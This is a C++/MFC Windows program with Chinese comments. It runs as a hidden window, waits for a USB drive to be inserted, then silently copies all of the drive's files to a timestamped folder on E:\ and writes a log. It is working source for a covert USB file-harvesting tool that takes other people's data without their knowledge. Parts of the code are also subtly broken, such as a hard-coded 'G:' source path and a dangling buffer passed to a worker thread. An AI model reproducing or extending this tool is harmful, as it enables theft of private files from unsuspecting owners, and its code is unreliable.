#include "afxmt.h"
#include "Afxwin.h"
//#include <afx.h>
#include <dbt.h>
#include <shellapi.h>
#include <time.h>
#include "math.h"
#include <stdio.h>
#include<io.h>           //读取文件名要包含的头文件 
#include<iostream>
#include<stdlib.h>
#include<vector>
#include<fstream>
using namespace std;
CString DestDirPath = "E:\\";//把U盘中的文件复制到D：
CCriticalSection logfile;
void GetMobileDrive();
bool MyCopyFile(HWND hwnd, CString SourcePath, CString DestinationPath, CString p_driver);
CString GetDirectoryName();
UINT  ProcDriver(LPVOID pParam);
void GetFileName(string path, vector<CString>& filesName);
char* csToChar(CString str);
char* csToChar(CString str)
{
    char* ptr;
#ifdef _UNICODE
    LONG len;
    len = WideCharToMultiByte(CP_ACP, 0, str, -1, NULL, 0, NULL, NULL);
    ptr = new char[len + 1];
    memset(ptr, 0, len + 1);
    WideCharToMultiByte(CP_ACP, 0, str, -1, ptr, len + 1, NULL, NULL);
#else
    ptr = new char[str.GetAllocLength() + 1];
    sprintf(ptr, _T("%s"), str);
#endif
    return ptr;
}
LRESULT CALLBACK CallWindowProc(
    HWND hwnd,      // handle to window
    UINT uMsg,      // message identifier
    WPARAM wParam,  // first message parameter
    LPARAM lParam   // second message parameter
)
{
    //HDC hdc;
    switch (uMsg)
    {
    case WM_CLOSE:       //窗口关闭消息   
        DestroyWindow(hwnd);
        break;
    case WM_DESTROY:     //破坏窗口消息
        PostQuitMessage(0);  //立刻回报
        break;
    case WM_DEVICECHANGE:
    {
        switch (wParam)
        {
        case DBT_DEVICEARRIVAL:
            DEV_BROADCAST_HDR* stHDR;
            stHDR = (DEV_BROADCAST_HDR*)lParam;
            switch (stHDR->dbch_devicetype)//判断设备类型
            {
            case DBT_DEVTYP_VOLUME://逻辑卷标
                GetMobileDrive();//取得可移动磁盘盘符存
                //储在strMobileDriver中
                break;
            }
            break;
        default:
            break;
        }
        break;
    }
    default:
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    return 0;
}
int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPTSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    WNDCLASS wndcls;
    wndcls.cbClsExtra = 0;  //额外分配给窗口类的字节数，系统初始化为0
    wndcls.cbWndExtra = 0;//额外分配给窗口实例的字节数，初始化为0 
    wndcls.hbrBackground = HBRUSH(COLOR_WINDOWTEXT | COLOR_WINDOW); //窗口背景刷
    wndcls.hCursor = LoadCursor(NULL, IDC_NO);;//窗口类的光标句柄
    wndcls.hIcon = LoadIcon(NULL, IDI_WINLOGO);
    wndcls.hInstance = hInstance;
    wndcls.lpfnWndProc = CallWindowProc;//窗口接到消息时调用的函数名称
    const wchar_t* name = L"Lijiayang";
    wndcls.lpszClassName = name;//窗口的名称
    wndcls.lpszMenuName = 0;
    wndcls.style = CS_HREDRAW | CS_VREDRAW;//定义窗口的样式
    wndcls.style &= ~WS_MINIMIZEBOX;

    RegisterClass(&wndcls);//根据初始化属性注册窗口类

    HWND hwnd;
    hwnd = CreateWindow(name, L"Copy_File", WS_OVERLAPPEDWINDOW, 0, 0,
        20, 20, NULL, NULL, hInstance, NULL);//创建该窗口

    ShowWindow(hwnd, SW_HIDE);//以隐藏方式显示当前窗口
    UpdateWindow(hwnd);//更新当前窗口

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        //PeekMessage(&msg,hwnd,0,0,PM_NOREMOVE);
        DispatchMessage(&msg);
    }

    return 0;
}
void GetMobileDrive()
{
    CString l_driver;
    DWORD id = GetLogicalDrives();
    for (int i = 1; i < 26; i++)
    {
        if ((id & (1 << i)) != 0)//检查盘符是否存在，id每一位对应了一个逻辑驱动器是否存在。第二位如果是“1”则表示驱动器“B:”存在，第四位如果是“1”则表示驱动器“D:”存在
        {
            CString l_driver = CString(char('A' + i)) + ":";
            if (GetDriveType(l_driver) == DRIVE_REMOVABLE)
            {
                AfxBeginThread(ProcDriver, (LPVOID)l_driver.GetBuffer(0));//为每个U盘创建一个线程来进行拷贝工作,LVPVOID可以看做java中Object类.
                Sleep(100);//每100ms执行一次
            }
        }
    }
}

CString GetDirectoryName()
{
    CString direct;
    CTime t = CTime::GetCurrentTime();
    direct = t.Format("_%Y_%B_%d_%H时%M分%S秒");
    return direct;
}


UINT  ProcDriver(LPVOID pParam)
{
    CString strSourcePath = "";
    clock_t start, finish;
    CString strMobileDriver = "";//存储可移动磁盘盘符
    CString T_start;
    CString s;
    double i, j, sy;
    CString totalspace1, freespace1;
    ULARGE_INTEGER   FreeAv, TotalBytes, FreeBytes;
    CString l_driver = (char*)pParam;
    CString s_driver = l_driver + ":";
    if (GetDiskFreeSpaceEx(s_driver, &FreeAv, &TotalBytes, &FreeBytes))
    {
        totalspace1.Format(L"磁盘%s容量:%.5fGB", s_driver, double(TotalBytes.QuadPart) / 1024 / 1024 /1024);
        freespace1.Format(L"剩余磁盘容量:%.5fGB", double(FreeBytes.QuadPart) / 1024 / 1024 /1024);
    }

    if (!l_driver.IsEmpty())
    {
        vector<CString> filesName;
        string path = "G:";
        start = clock();
        GetFileName(path, filesName);
        CString DirName = GetDirectoryName() + l_driver.Left(1);
        T_start = DirName;
        //创建目录
        CreateDirectory(DestDirPath + DirName, NULL);
        CString DestinationPath = DestDirPath+ DirName ;
        for (size_t i = 0; i < filesName.size(); i++) {
            strSourcePath = l_driver + ":\\" + filesName[i];
            MyCopyFile(NULL, strSourcePath, DestinationPath, l_driver);
        }
    }
    finish = clock();
    i = double (TotalBytes.QuadPart) / 1024 / 1024 /1024;
    j = double (FreeBytes.QuadPart) / 1024 / 1024 /1024;
    sy = i - j;
    CString usespace;
    usespace.Format(L"%.5f", sy);
    double  duration;
    CString T_finish;
    //duration = (double)( finish -  start) / CLOCKS_PER_SEC;
    logfile.Lock();
    CTime t = CTime::GetCurrentTime();
    T_finish = t.Format("_%Y_%B_%d_%H时%M分%S秒");
    FILE* out = fopen("E:\\log.txt", "a");
    duration = (double)(finish - start) / CLOCKS_PER_SEC;
    CString str_time, str_time1;
    str_time.Format(L"用时:%.6fs", duration);
    s = "开始时间" + T_start + "    " + "结束时间" + T_finish + "\n" + "持续" + str_time + "\n";
    s = s + totalspace1 + "   " + freespace1 + "   " + "文件大小:" + usespace + "GB""\n";
    fputs(csToChar(s), out);
    fclose(out);
    logfile.Unlock();
    return 0;
}


bool MyCopyFile(HWND hwnd, CString SourcePath, CString DestinationPath, CString p_driver)
{
    //取得复制到的目录名称
    char* source_path = csToChar(SourcePath);
    //SourcePath.GetBuffer(SourcePath.GetLength());
    SourcePath.GetBufferSetLength(strlen(source_path) + 2);
    SourcePath.SetAt(strlen(source_path) + 1, '\0');
    //声明文件操作结构体FileOP，设置属性
    SHFILEOPSTRUCT FileOP;   //声明文件操作结构体
    memset((void*)&FileOP, 0, sizeof(FileOP));
    FileOP.hwnd = hwnd;   //句柄
    FileOP.fFlags = FOF_SILENT; //操作标志位
    FileOP.wFunc = FO_COPY;   //操作方式
    FileOP.pFrom = SourcePath;  //源地址
    CString str = DestinationPath;  //目的地址
    char* DestPath = csToChar(str);
    //执行复制操作
    str.GetBufferSetLength(strlen(DestPath) + 2);
    str.SetAt(strlen(DestPath) + 1, '\0');
    FileOP.pTo = str;
    FileOP.fAnyOperationsAborted = false; //是否允许中断操作
    FileOP.hNameMappings = NULL;
    FileOP.lpszProgressTitle = NULL;
    SourcePath.ReleaseBuffer();
    str.ReleaseBuffer();
    int MSG = SHFileOperation(&FileOP); //执行复制操作 
    return (MSG == 0);
}
void GetFileName(string path, vector<CString>& filesName)
{

    _int64   hFile = 0;                    //文件句柄 
    struct _finddata_t fileinfo;        //定义文件信息结构体
    string p;
    if ((hFile = _findfirst(p.assign(path).append("\\*").c_str(), &fileinfo)) != -1) //使用函数_findfirst()打开文件并获取第一个文件名
    {
        do
        {
            if (strcmp(fileinfo.name, ".") != 0 && strcmp(fileinfo.name, "..") != 0)  //"."表示当前目录，".."表示父目录
                filesName.push_back(fileinfo.name);
        } while (_findnext(hFile, &fileinfo) == 0);      //使用函数_findnext()继续获取其他文件名
        _findclose(hFile);              //使用函数_findclose()关闭文件夹
    }
}